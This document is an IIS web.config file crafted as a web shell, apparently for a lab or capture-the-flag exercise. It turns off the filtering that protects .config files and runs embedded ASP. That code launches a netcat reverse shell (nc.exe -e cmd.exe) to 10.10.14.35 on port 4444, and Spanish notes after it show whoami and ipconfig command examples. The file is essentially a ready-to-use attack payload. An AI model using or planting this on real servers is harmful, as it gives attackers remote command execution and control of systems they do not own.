<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />        
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
 Set rs = CreateObject("WScript.Shell")
 Set cmd = rs.Exec("cmd /c C:\\Users\\public\\nc.exe -e cmd.exe 10.10.14.35 4444")
 o = cmd.StdOut.Readall()
 Response.write(o)
%>
-->


ejemplo de lanzamiento de comandos
Set cmd = rs.Exec("cmd /c whoami")
Set cmd = rs.Exec("cmd /c ipconfig")
